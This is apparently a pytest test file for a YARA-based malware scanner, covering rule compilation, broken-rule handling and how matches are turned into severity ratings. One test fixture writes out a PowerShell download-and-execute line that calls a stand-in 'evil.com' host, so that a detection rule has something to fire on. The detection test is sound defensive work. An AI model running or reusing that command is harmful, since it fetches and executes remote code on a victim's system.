"""
Tests for YARA scanner - per-file compilation isolation and scanning.
"""

import pytest
from unittest.mock import patch, MagicMock
from pathlib import Path


class TestAnalyzersYaraCompilation:
    """Test src/analyzers/yara_scanner.py per-file compilation."""

    def test_compile_rules_missing_dir(self):
        """compile_rules() returns False when rules_dir doesn't exist."""
        from src.analyzers.yara_scanner import YARAScanner, YARA_AVAILABLE
        if not YARA_AVAILABLE:
            pytest.skip("yara-python not installed")

        scanner = YARAScanner(rules_dir='/nonexistent/path')
        assert scanner.compile_rules() is False

    def test_compile_rules_empty_dir(self, tmp_path):
        """compile_rules() returns False when dir has no .yar files."""
        from src.analyzers.yara_scanner import YARAScanner, YARA_AVAILABLE
        if not YARA_AVAILABLE:
            pytest.skip("yara-python not installed")

        scanner = YARAScanner(rules_dir=str(tmp_path))
        assert scanner.compile_rules() is False

    def test_compile_rules_valid_file(self, tmp_path):
        """compile_rules() succeeds with a valid rule file."""
        from src.analyzers.yara_scanner import YARAScanner, YARA_AVAILABLE
        if not YARA_AVAILABLE:
            pytest.skip("yara-python not installed")

        rule_file = tmp_path / "test_rule.yar"
        rule_file.write_text(
            'rule TestRule { strings: $a = "test" condition: $a }'
        )
        scanner = YARAScanner(rules_dir=str(tmp_path))
        assert scanner.compile_rules() is True
        status = scanner.get_compilation_status()
        assert status['compiled'] == 1
        assert status['total'] == 1
        assert status['failed'] == {}

    def test_compile_rules_skips_broken_file(self, tmp_path):
        """One broken rule file should not prevent others from compiling."""
        from src.analyzers.yara_scanner import YARAScanner, YARA_AVAILABLE
        if not YARA_AVAILABLE:
            pytest.skip("yara-python not installed")

        # Valid rule
        good = tmp_path / "good_rule.yar"
        good.write_text(
            'rule GoodRule { strings: $a = "good" condition: $a }'
        )
        # Broken rule (syntax error)
        bad = tmp_path / "bad_rule.yar"
        bad.write_text('rule BrokenRule { this is not valid yara }')

        scanner = YARAScanner(rules_dir=str(tmp_path))
        assert scanner.compile_rules() is True

        status = scanner.get_compilation_status()
        assert status['compiled'] == 1
        assert status['total'] == 2
        assert 'bad_rule' in status['failed']

    def test_compile_rules_all_broken(self, tmp_path):
        """If all rule files are broken, compile_rules() returns False."""
        from src.analyzers.yara_scanner import YARAScanner, YARA_AVAILABLE
        if not YARA_AVAILABLE:
            pytest.skip("yara-python not installed")

        bad1 = tmp_path / "bad1.yar"
        bad1.write_text('rule Bad1 { invalid }')
        bad2 = tmp_path / "bad2.yar"
        bad2.write_text('rule Bad2 { also invalid }')

        scanner = YARAScanner(rules_dir=str(tmp_path))
        assert scanner.compile_rules() is False

        status = scanner.get_compilation_status()
        assert status['compiled'] == 0
        assert status['total'] == 2

    def test_scan_file_after_partial_compile(self, tmp_path):
        """Scanning should work even if some rule files failed."""
        from src.analyzers.yara_scanner import YARAScanner, YARA_AVAILABLE
        if not YARA_AVAILABLE:
            pytest.skip("yara-python not installed")

        good = tmp_path / "rules" / "detect_test.yar"
        good.parent.mkdir()
        good.write_text(
            'rule DetectTestString { strings: $a = "MALICIOUS_MARKER" condition: $a }'
        )
        bad = tmp_path / "rules" / "broken.yar"
        bad.write_text('rule Broken { not valid }')

        target = tmp_path / "target.bin"
        target.write_bytes(b"some data with MALICIOUS_MARKER inside")

        scanner = YARAScanner(rules_dir=str(tmp_path / "rules"))
        result = scanner.scan_file(str(target))
        assert result['match_count'] >= 1
        assert any(m['rule'] == 'DetectTestString' for m in result['matches'])

    def test_get_compilation_status_default(self):
        """get_compilation_status returns default when compile not called."""
        from src.analyzers.yara_scanner import YARAScanner, YARA_AVAILABLE
        if not YARA_AVAILABLE:
            pytest.skip("yara-python not installed")

        scanner = YARAScanner()
        status = scanner.get_compilation_status()
        assert status['total'] == 0
        assert status['compiled'] == 0


class TestUtilsYaraCompilation:
    """Test src/utils/yara_scanner.py per-file compilation."""

    def test_builtin_rules_compile(self):
        """Built-in rules compile successfully when no path is given."""
        from src.utils.yara_scanner import YaraScanner, YARA_AVAILABLE
        if not YARA_AVAILABLE:
            pytest.skip("yara-python not installed")

        scanner = YaraScanner()
        assert scanner.rules is not None

    def test_single_custom_file(self, tmp_path):
        """Single custom rule file compiles correctly."""
        from src.utils.yara_scanner import YaraScanner, YARA_AVAILABLE
        if not YARA_AVAILABLE:
            pytest.skip("yara-python not installed")

        rule = tmp_path / "custom.yar"
        rule.write_text(
            'rule Custom { strings: $a = "custom" condition: $a }'
        )
        scanner = YaraScanner(rules_path=str(rule))
        assert scanner.rules is not None
        status = scanner.get_compilation_status()
        assert status['compiled'] == 1

    def test_directory_with_mixed_rules(self, tmp_path):
        """Directory compilation skips broken files, compiles good ones."""
        from src.utils.yara_scanner import YaraScanner, YARA_AVAILABLE
        if not YARA_AVAILABLE:
            pytest.skip("yara-python not installed")

        good = tmp_path / "good.yar"
        good.write_text(
            'rule GoodDir { strings: $a = "good" condition: $a }'
        )
        bad = tmp_path / "bad.yar"
        bad.write_text('rule BadDir { invalid syntax here }')

        scanner = YaraScanner(rules_path=str(tmp_path))
        assert scanner.rules is not None

        status = scanner.get_compilation_status()
        assert status['compiled'] == 1
        assert status['total'] == 2
        assert 'bad' in status['failed']

    def test_directory_all_broken_falls_back(self, tmp_path):
        """When all directory rules fail, falls back to built-in rules."""
        from src.utils.yara_scanner import YaraScanner, YARA_AVAILABLE
        if not YARA_AVAILABLE:
            pytest.skip("yara-python not installed")

        bad = tmp_path / "broken.yar"
        bad.write_text('rule AllBad { nope }')

        scanner = YaraScanner(rules_path=str(tmp_path))
        # Should fall back to built-in rules rather than None
        assert scanner.rules is not None
        status = scanner.get_compilation_status()
        assert status['compiled'] == 0

    def test_scan_with_builtin_rules(self, tmp_path):
        """Built-in rules detect known patterns."""
        from src.utils.yara_scanner import YaraScanner, YARA_AVAILABLE
        if not YARA_AVAILABLE:
            pytest.skip("yara-python not installed")

        # Create a file that should match Suspicious_PowerShell rule
        target = tmp_path / "suspicious.ps1"
        target.write_text(
            'IEX (New-Object Net.WebClient).DownloadString("http://evil.com/payload")'
        )

        scanner = YaraScanner()
        matches = scanner.scan_file(str(target))
        assert len(matches) > 0
        rule_names = [m['rule'] for m in matches]
        assert 'Suspicious_PowerShell' in rule_names


class TestYaraInterpretation:
    """Test match interpretation in utils scanner."""

    def test_interpret_no_matches(self):
        from src.utils.yara_scanner import YaraScanner
        result = YaraScanner.interpret_matches([])
        assert result['severity'] == 'NONE'
        assert result['malware_families'] == []

    def test_interpret_malware_match(self):
        from src.utils.yara_scanner import YaraScanner
        matches = [{'rule': 'Emotet_Strings', 'tags': [], 'meta': {}, 'strings': []}]
        result = YaraScanner.interpret_matches(matches)
        assert result['severity'] == 'CRITICAL'
        assert 'Emotet' in result['malware_families']

    def test_interpret_technique_match(self):
        from src.utils.yara_scanner import YaraScanner
        matches = [{'rule': 'Anti_Debug', 'tags': [], 'meta': {}, 'strings': []}]
        result = YaraScanner.interpret_matches(matches)
        assert result['severity'] == 'MEDIUM'
        assert 'Anti_Debug' in result['techniques']

    def test_interpret_packer_match(self):
        from src.utils.yara_scanner import YaraScanner
        matches = [{'rule': 'Packer_UPX', 'tags': [], 'meta': {}, 'strings': []}]
        result = YaraScanner.interpret_matches(matches)
        assert 'Packed executable' in result['techniques']

    def test_interpret_multiple_matches(self):
        from src.utils.yara_scanner import YaraScanner
        matches = [
            {'rule': 'Cobalt_Strike', 'tags': [], 'meta': {}, 'strings': []},
            {'rule': 'Code_Injection', 'tags': [], 'meta': {}, 'strings': []},
            {'rule': 'Packer_UPX', 'tags': [], 'meta': {}, 'strings': []},
        ]
        result = YaraScanner.interpret_matches(matches)
        assert result['severity'] == 'CRITICAL'
        assert 'Cobalt' in result['malware_families']
        assert len(result['recommendations']) >= 3


class TestYaraWithoutYaraPython:
    """Test graceful degradation when yara-python is not installed."""

    def test_analyzers_scanner_no_yara(self):
        """YARAScanner returns empty results when YARA is unavailable."""
        with patch.dict('sys.modules', {'yara': None}):
            # Re-import to test with yara unavailable
            import importlib
            import src.analyzers.yara_scanner as mod
            original_avail = mod.YARA_AVAILABLE
            mod.YARA_AVAILABLE = False
            try:
                scanner = mod.YARAScanner()
                assert scanner.compile_rules() is False
                result = scanner.scan_file('/fake/path')
                assert result['matches'] == []
                assert 'error' in result
            finally:
                mod.YARA_AVAILABLE = original_avail

    def test_utils_scanner_no_yara(self):
        """YaraScanner returns empty list when YARA is unavailable."""
        import src.utils.yara_scanner as mod
        original_avail = mod.YARA_AVAILABLE
        mod.YARA_AVAILABLE = False
        try:
            scanner = mod.YaraScanner.__new__(mod.YaraScanner)
            scanner.rules = None
            scanner.rules_path = None
            result = scanner.scan_file('/fake/path')
            assert result == []
        finally:
            mod.YARA_AVAILABLE = original_avail
